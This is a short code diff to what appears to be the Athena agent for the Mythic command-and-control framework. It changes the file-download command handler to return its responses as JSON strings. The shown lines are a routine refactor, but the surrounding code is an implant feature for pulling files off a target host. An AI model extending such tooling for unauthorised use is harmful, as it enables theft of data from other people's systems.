@@ -22,7 +22,7 @@ namespace Athena.Commands
         /// Create and start a new download job
         /// </summary>
         /// <param name="job">MythicJob containing the job task</param>
-        public async Task<DownloadResponse> StartDownloadJob(MythicJob job)
+        public async Task<string> StartDownloadJob(MythicJob job)
         {
             MythicDownloadJob downloadJob = new MythicDownloadJob(job);
             Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);
@@ -40,7 +40,7 @@ namespace Athena.Commands
                     user_output = "An error occurred while attempting to access the file.",
                     completed = "true",
                     task_id = job.task.id
-                };
+                }.ToJson();
             }
             return new DownloadResponse
             {
@@ -53,7 +53,7 @@ namespace Athena.Commands
                 chunk_num = 0,
                 chunk_data = String.Empty,
                 file_id = String.Empty
-            };
+            }.ToJson();
         }
         /// <summary>
         /// Check to see if a download job has started
